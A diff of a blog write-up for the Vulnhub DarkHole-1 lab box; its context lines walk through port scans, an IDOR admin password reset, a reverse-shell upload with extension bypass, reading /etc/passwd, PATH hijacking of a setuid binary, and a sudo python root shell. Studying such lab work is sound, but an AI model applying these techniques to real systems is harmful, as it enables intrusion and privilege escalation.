@@ -7,7 +7,7 @@ tags: ctf vulnhub darkhole
 ---
 Welcome to another day and another writeup. This week we have picked a new box from Vulnhub to haxxor tonight. [DarkHole-1](https://www.vulnhub.com/entry/darkhole-1,724/) (Easy Difficulty)
 
-Watch the [VOD]() on our youtube channel. (link coming soon)
+Watch the [VOD](https://www.youtube.com/watch?v=SkVSQI2mZFI) & [VOD part 2 cause internet](https://www.youtube.com/watch?v=JL0bflwdudc) on our youtube channel.
 
 ## Prep:
 - Get your VMs a running (Kali and _the target_)
@@ -25,21 +25,21 @@ export TARGETIP=192.168.1.19
 Ok lets get down to business, to defeat the box.
 Lets start the same way we start every night. With a nmap scan.
 ```
-nmap -sC -sV $TARGETIP
+nmap -sC -sV $TARGETIP -oN nmap
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-22 06:59 EDT
 Nmap scan report for 192.168.1.19
 Host is up (0.0016s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 e4:50:d9:50:5d:91:30:50:e9:b5:7d:ca:b0:51:db:74 (RSA)
 |   256 73:0c:76:86:60:63:06:00:21:c2:36:20:3b:99:c1:f7 (ECDSA)
 |_  256 54:53:4c:3f:4f:3a:26:f6:02:aa:9a:24:ea:1b:92:8c (ED25519)
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
 |_      httponly flag not set
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: DarkHole
@@ -79,7 +79,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /config               (Status: 301) [Size: 313] [--> http://192.168.1.19/config/]
 /dashboard.php        (Status: 200) [Size: 21]                                   
 /server-status        (Status: 403) [Size: 277]                                  
-                                                                                 
+
 ===============================================================
 2021/08/22 07:03:53 Finished
 ===============================================================
@@ -87,7 +87,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Browsing the website it seems overall fairly simple with a login button up the top. Nothing much under the hood when we inspect it. Lets take a look at the login page.
 Looks like a standard login page and not much when we inspect source again. But there is the option to register a user. Lets register a user and see what happens.
-Once we have registered and logged in we see a simple dashboard that allows us to change our details or our password. 
+Once we have registered and logged in we see a simple dashboard that allows us to change our details or our password.
 ```
 http://192.168.1.19/dashboard.php?id=2
 ```
@@ -101,21 +101,21 @@ Back to burpsuite and we see out password change request. And there is an id val
 
 Change id to 1 and forward that request on.
 Lets see what happens next. No errors returned. Lets see if we can login. Unfortunately we dont know the username but lets guess at some common admin names. I think when going through this initially I guess admin first time and it was correct so `¯\_(ツ)_/¯`
-Lets login with the new password we just set. 
+Lets login with the new password we just set.
 ```
 User: admin
 Password: thoseguys
 ```
 And we are in and have a new option to look at. Upload.
 
-Lets pause here for a sec and go back to the gobuster results. 
-We notice some interesting folders available. Config and upload. 
+Lets pause here for a sec and go back to the gobuster results.
+We notice some interesting folders available. Config and upload.
 ```
 http://192.168.1.19/config/
 ```
 Browsing the config directory (directory listing is enabled yay), we just see a database.php file which gives us nothing right now.
 
-Browsing upload we notice a jpg but not much else. 
+Browsing upload we notice a jpg but not much else.
 ```
 http://192.168.1.19/upload/
 ```
@@ -123,7 +123,7 @@ However we did see an upload function in the website just before. Lets go upload
 Lets try upload a reverseshell from burp.
 
 ```
-touch rev.php 
+touch rev.php
 vim rev.php
 ```
 ```
@@ -135,7 +135,7 @@ Unfortunately, this fails with the following error.
 Sorry , Allow Ex : jpg,png,gif
 ```
 Lets check if this is just whitelisting jpg,png,gif or blacklisting php/a regex.
-Lets send a file again and intercept the upload request with our proxy in Burp. 
+Lets send a file again and intercept the upload request with our proxy in Burp.
 Send it over to intruder (CTRL + I) to try a list of extensions in order to determine if the app uses a whitelist or a blacklist:
 
 ![BurpIntruderPayload.png]({{site.baseurl}}/Images/vb-darkhole/BurpIntruderPayload.png)
@@ -196,7 +196,7 @@ So lets start with some standard enumeration and exploration.
 
 
 ```
-www-data@darkhole:/var/www/html/upload$ cat /etc/passwd 
+www-data@darkhole:/var/www/html/upload$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -234,7 +234,7 @@ lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
 john:x:1001:1001:,,,:/home/john:/bin/bash
 ```
-We have two intersting users 'John' and 'darkhole' in there. 
+We have two intersting users 'John' and 'darkhole' in there.
 
 While searching around John’s home directory to see if we might happen to be able to add our own ssh keys, we notice that John also has a root owned binary called toto that has a sticky bit set:
 
@@ -317,7 +317,7 @@ www-data@darkhole:/tmp$ echo $PATH
 /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
 ```
 
-We use :$PATH in our export so that we don’t overwrite the existing variable, but just perpend our /tmp directory so that it gets checked first. now if we `which id` we see ours will run. and if we try to run it directly we get a permission denied error
+We use :$PATH in our export so that we don’t overwrite the existing variable, but just prepend our /tmp directory so that it gets checked first. now if we `which id` we see ours will run. and if we try to run it directly we get a permission denied error
 ```
 www-data@darkhole:/tmp$ which id
 /tmp/id
@@ -337,7 +337,7 @@ Now we could su up to John and steal the ssh private key we discovered earlier, 
 
 ```
 ssh john@$TARGETIP  
-john@192.168.1.164's password: 
+john@192.168.1.164's password:
 Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -360,12 +360,12 @@ The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
 Last login: Sat Jul 17 21:46:18 2021
-john@darkhole:~$ 
+john@darkhole:~$
 ```
 
 Now that we are John, we restart our enumeration of the file system. In the bash_history we notice something interesting:
 ```
-cat .bash_history 
+cat .bash_history
 ssh-copy-id root@192.168.135.129
 ls
 cd .ssh
@@ -373,7 +373,7 @@ ls
 ssh-copy-id -i id_rsa.pub root@192.168.135.129
 ls
 cat id_rsa
-cat id_rsa.pub 
+cat id_rsa.pub
 ssh-copy-id root@192.168.135.129
 sudo mysql
 mysql
@@ -397,17 +397,17 @@ ls
 su root
 mysql -u john -p
 mysql -u jonh -p john
-mysql -u john -p darkhole < darkhole.sql 
+mysql -u john -p darkhole < darkhole.sql
 mysql -u john -p
-mysql -u john -p darkhole < darkhole.sql 
+mysql -u john -p darkhole < darkhole.sql
 mysql -u john
 mysql -u john -p
-service apache2 restart 
+service apache2 restart
 php -b
 php -v
 cd DarkHole/
 ls
-nano login.php 
+nano login.php
 su root
 su root
 mysql -u jonh -p
@@ -419,7 +419,7 @@ mysql -u john
 mysql -u john -p
 ls
 su root
-mysql -u john -o 
+mysql -u john -o
 mysql -u john -p
 cd /var/
 cd www
@@ -427,7 +427,7 @@ cd html/
 cd DarkHole/
 ls
 cd config/
-nano database.php 
+nano database.php
 su root
 ls
 sudo -l
@@ -456,21 +456,21 @@ exit
 ssh-copy-id root@192.168.135.129
 clear
 ls
-nano file.py 
+nano file.py
 touch file.py
 touch password
-nano password 
+nano password
 ls
-nano file.py 
-chmod 770 file.py 
+nano file.py
+chmod 770 file.py
 sudo -l
 /usr/bin/python3 /home/john/file.py
 ls
 chmod 770 password
 cat password
-nano file.py 
+nano file.py
 sudo -l
-nano file.py 
+nano file.py
 sudo -l
 sudo /usr/bin/python3 /home/john/file.py
 clear
@@ -478,7 +478,7 @@ id
 exit
 cat password
 exit
-mysql -u john -p darkhole < darkhole.sql 
+mysql -u john -p darkhole < darkhole.sql
 mysql
 su root
 mysql -u john
@@ -515,7 +515,7 @@ pty.spawn("/bin/bash")
 run the file with sudo and we get root!
 ```
 john@darkhole:~$ sudo /usr/bin/python3 /home/john/file.py
-root@darkhole:/home/john# 
+root@darkhole:/home/john#
 ```
 
 ```
